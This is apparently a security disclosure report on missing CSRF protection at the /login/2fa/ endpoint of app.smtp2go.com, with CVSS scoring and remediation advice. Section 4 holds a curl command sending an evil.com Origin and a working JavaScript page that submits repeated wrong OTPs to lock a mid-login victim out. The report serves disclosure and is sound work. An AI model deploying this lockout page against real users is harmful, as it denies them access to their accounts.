# [Low] No CSRF Protection on /login/2fa/ Enables Cross-Origin OTP Lockout

---

## 1. Summary

The `POST /login/2fa/` endpoint on `app.smtp2go.com` accepts cross-origin requests with no CSRF token and no `Origin` header validation. Any web page can silently submit OTP guesses against a victim who is mid-login (has passed the username/password step). Because the server enforces a lockout after ~3–5 failed attempts, an attacker can trigger account lockout cross-site by submitting incorrect OTP codes from a malicious page the victim visits simultaneously.

---

## 2. Vulnerability Details

- **Class**: Missing CSRF Protection / Cross-Origin Request Forgery
- **Endpoint**: `POST https://app.smtp2go.com/login/2fa/`
- **Root cause**: No CSRF token in the 2FA submission form. No `SameSite` attribute on session/login cookies. Server accepts `Origin: https://evil.com` with a `200 OK` response.

---

## 3. Severity

- **Rating**: Low
- **CVSS v3.1**: 3.7 — AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L
- **Justification**: Requires victim to be mid-2FA-login and visit attacker's page simultaneously (high attack complexity). Impact is limited to availability (lockout) rather than full account takeover.

---

## 4. Steps to Reproduce

**Confirm cross-origin acceptance:**
```bash
curl -s -X POST 'https://app.smtp2go.com/login/2fa/' \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'otp=000000'
```
**Result**: Server responds with `200 OK` (no CORS rejection, no CSRF error). The OTP guess is processed.

**Lockout PoC:**
```html
<!-- Attacker page — lure victim to visit while they are on the 2FA screen -->
<script>
async function lockout() {
  for (let i = 0; i < 6; i++) {
    await fetch('https://app.smtp2go.com/login/2fa/', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'otp=000000'
    });
  }
}
lockout();
</script>
```

Victim visits the page while at the 2FA step → 6 bad OTP submissions → account locked out for ~7–10 minutes.

---

## 5. Impact

- Attacker can trigger 2FA lockout for a targeted user mid-login without user interaction beyond page visit
- Disrupts authentication workflow, denying account access during lockout window
- Combined with social engineering ("click here to verify your identity while logging in"), attack complexity drops to Medium

---

## 6. Recommended Remediation

1. Add a CSRF token to the `/login/2fa/` form and validate server-side
2. Set `SameSite=Strict` on the session and `login_id` cookies to block cross-site POST requests automatically
3. Validate `Origin` header against the allowlist for all state-changing POST endpoints

---

*Tested on: 2026-05-08*
